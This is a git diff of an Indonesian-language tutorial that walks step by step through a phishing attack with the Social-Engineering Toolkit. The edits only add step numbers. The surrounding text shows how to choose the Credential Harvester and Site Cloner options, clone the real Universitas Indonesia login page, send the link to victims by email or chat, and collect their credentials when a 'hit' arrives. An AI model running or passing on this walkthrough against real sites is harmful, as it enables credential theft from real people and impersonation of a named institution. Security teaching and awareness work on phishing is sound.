@@ -67,7 +67,7 @@ Contoh skenario:
    set> 
    ```
 
-   Ini merupakan menu utama dari tool SET. Untuk melakukan serangan phishing pilih menu nomer `1` yaitu `Social-Engineering Attacks`.
+   2. Ini merupakan menu utama dari tool SET. Untuk melakukan serangan phishing pilih menu nomer `1` yaitu `Social-Engineering Attacks`.
 
    ```
       It's easy to update using the PenTesters Framework! (PTF)
@@ -92,7 +92,7 @@ Contoh skenario:
    set>
    ```
 
-   Setelah masuk ke dalam menu `Social-Engineering Attacks`, langkah selanjutnya pilih menu nomer `2` yaitu `Website Attack Vectors`.
+   3. Setelah masuk ke dalam menu `Social-Engineering Attacks`, langkah selanjutnya pilih menu nomer `2` yaitu `Website Attack Vectors`.
 
    ```
       It's easy to update using the PenTesters Framework! (PTF)
@@ -114,7 +114,7 @@ Contoh skenario:
    set:webattack>
    ```
 
-   Pada menu ini kita pilih menu nomer `3` yaitu `Credential Harvester Attack Method`.
+   4. Pada menu ini kita pilih menu nomer `3` yaitu `Credential Harvester Attack Method`.
 
    ```
     The first method will allow SET to import a list of pre-defined web
@@ -137,7 +137,7 @@ Contoh skenario:
    set:webattack>
    ```
 
-   Pada menu ini kita pilih menu nomer `2` yaitu `Site Cloner`.
+   5. Pada menu ini kita pilih menu nomer `2` yaitu `Site Cloner`.
 
    ```
    [-] Credential harvester will allow you to utilize the clone capabilities within SET
@@ -164,7 +164,7 @@ Contoh skenario:
    set:webattack> IP address for the POST back in Harvester/Tabnabbing [192.168.1.42]:
    ```
 
-   Pada tahap ini, kita diminta untuk memasukkan alamat IP yang akan digunakan sebagai tujuan `POST back`. Anda bisa langsung menekan `Enter` untuk menggunakan alamat IP default (yang terdeteksi otomatis).
+   6. Pada tahap ini, kita diminta untuk memasukkan alamat IP yang akan digunakan sebagai tujuan `POST back`. Anda bisa langsung menekan `Enter` untuk menggunakan alamat IP default (yang terdeteksi otomatis).
 
    ```
    [-] SET supports both HTTP and HTTPS
@@ -172,7 +172,7 @@ Contoh skenario:
    set:webattack> Enter the url to clone: 
    ```
 
-   Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia).
+   7. Pada tahap ini kita diminta untuk memasukkan alamat url yang mau kita clone. di sini sebagai contoh, kita masukkan url login dari website login `SIMAK UI` (Universitas Indonesia).
 
    ```
    set:webattack> Enter the url to clone: https://penerimaan.ui.ac.id/login
@@ -186,7 +186,7 @@ Contoh skenario:
    [*] Information will be displayed to you as it arrives below:
    ```
 
-   Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar.
+   8. Tahap selanjutnya adalah mengirim tautan phishing kepada target, misalnya melalui `email` atau `pesan instan`. Tunggu sampai korban memasukkan `username/email` dan `password` yang benar.
 
    ```
    [*] WE GOT A HIT! Printing the output:
